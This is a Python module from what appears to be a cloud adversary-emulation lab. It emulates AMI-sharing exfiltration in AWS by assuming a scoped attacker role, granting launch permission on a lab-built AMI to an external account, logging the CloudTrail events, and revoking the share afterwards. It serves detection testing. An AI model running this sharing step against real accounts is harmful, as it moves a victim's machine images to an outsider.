"""
Technique : aws.exfiltration.ec2-share-ami
Tactic    : Exfiltration (T1537 - Transfer Data to Cloud Account)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.exfiltration.ec2-share-ami/

How the attack works:
  ModifyImageAttribute adds launchPermission for an attacker account, which can
  then launch the AMI (or copy it) and mount its volumes in an account the
  victim does not control.

Safety:
  The AMI is built from an empty volume created by the lab; no tenant data is
  in it. The share targets the Stratus Red Team dummy account
  (193672423079), the same one used by aws_exfiltration_rds_share_snapshot,
  and is revoked in a finally block after a short dwell.

Detection signal:
  - ec2:ModifyImageAttribute with launchPermission.add naming an account
    outside the organization (or group "all" for public).

Revert:
  - The launch permission is removed in a finally block.

Credential model:
  Option B. The attack assumes the scoped attacker role created by infra/
  instead of acting as the tenant's cross-account role, so IAM bounds what
  it can reach.

Backend contract:
  run(outputs: dict, region: str = "us-east-1") -> None
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import time

import boto3
from botocore.exceptions import ClientError


def _bootstrap_session(outputs: dict, region: str):
    """Session for the attack. In the MayaTrail backend the worker injects the
    tenant's short-lived assumed-role credentials as outputs['_aws_credentials'];
    use them so the attack runs in the tenant account. Falls back to the ambient
    default session for standalone runs."""
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def _assume_role_with_retry(sts_client, role_arn, session_name, duration=3600, max_attempts=5):
    """
    AssumeRole with propagation retry.

    A freshly created IAM role and its inline policy take a few seconds to become
    consistent; sts:AssumeRole can return AccessDenied during that window.
    """
    retryable = {"AccessDenied", "InvalidClientTokenId", "AuthFailure"}
    last_exc = None
    for attempt in range(1, max_attempts + 1):
        try:
            return sts_client.assume_role(
                RoleArn=role_arn,
                RoleSessionName=session_name,
                DurationSeconds=duration,
            )
        except ClientError as exc:
            code = exc.response["Error"]["Code"]
            if code in retryable and attempt < max_attempts:
                print(f"  [~] AssumeRole attempt {attempt}/{max_attempts} got {code}, retrying in 5s")
                time.sleep(5)
                last_exc = exc
            else:
                raise
    raise RuntimeError(f"AssumeRole failed after {max_attempts} attempts: {last_exc}")


def _attacker_session(outputs: dict, region: str, session_name: str):
    """
    Build the session the technique runs as.

    The tenant credentials injected by the worker are used only to assume the
    scoped attacker role this emulation's infra creates. The technique's calls
    are then made by that role, so IAM bounds the blast radius rather than the
    correctness of this script.
    """
    role_arn = (outputs or {}).get("attacker_role_arn", "")
    if not role_arn:
        raise RuntimeError("Missing required Pulumi output: attacker_role_arn")

    sts = _bootstrap_session(outputs, region).client("sts")
    creds = _assume_role_with_retry(sts, role_arn, session_name)["Credentials"]
    print(f"  [+] Assumed scoped attacker role: {role_arn}")
    print("  [!] CloudTrail event: sts:AssumeRole")
    return boto3.Session(
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"],
        region_name=region,
    )


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}\n  {msg}\n{'=' * 60}")


def _require(outputs: dict, *keys: str) -> list:
    values = [(outputs or {}).get(k, "") for k in keys]
    missing = [k for k, v in zip(keys, values) if not v]
    if missing:
        raise RuntimeError(f"Missing required Pulumi output(s): {', '.join(missing)}")
    return values


ATTACKER_ACCOUNT_ID = "193672423079"
DWELL_TIME_S = 15


def run(outputs: dict, region: str = "us-east-1") -> None:
    (ami_id,) = _require(outputs, "ami_id")

    banner("Step 0 - Assume the scoped attacker role (AssumeRole)")
    session = _attacker_session(outputs, region, "atomic-t1537-share-ami")
    ec2 = session.client("ec2", region_name=region)

    shared = False
    try:
        banner("Step 1 - Share the AMI with an external account (ModifyImageAttribute)")
        try:
            ec2.modify_image_attribute(
                ImageId=ami_id,
                LaunchPermission={"Add": [{"UserId": ATTACKER_ACCOUNT_ID}]},
            )
            shared = True
            print(f"  [+] {ami_id} launch permission granted to {ATTACKER_ACCOUNT_ID}")
        except ClientError as exc:
            # AMIs backed by snapshots encrypted with the default aws/ebs key
            # (EBS encryption by default) cannot be shared.
            print(f"  [~] AWS refused the share: {exc.response['Error']['Code']}: "
                  f"{exc.response['Error']['Message']}")
            print("  [~] The attempt is still recorded in CloudTrail (errorCode set).")
        print("  [!] CloudTrail event: ec2:ModifyImageAttribute")

        banner("Step 2 - Verify the share (DescribeImageAttribute)")
        perms = ec2.describe_image_attribute(ImageId=ami_id, Attribute="launchPermission")
        accounts = [p.get("UserId") or p.get("Group") for p in perms.get("LaunchPermissions", [])]
        print(f"  [+] Launch permissions now: {accounts}")
        time.sleep(DWELL_TIME_S)
    finally:
        if shared:
            banner("Revert - Remove the launch permission (ModifyImageAttribute)")
            ec2.modify_image_attribute(
                ImageId=ami_id,
                LaunchPermission={"Remove": [{"UserId": ATTACKER_ACCOUNT_ID}]},
            )
            print(f"  [+] Launch permission for {ATTACKER_ACCOUNT_ID} removed")

    banner("Complete")
    print("CloudTrail events generated: sts:AssumeRole, ec2:ModifyImageAttribute x2, ec2:DescribeImageAttribute")
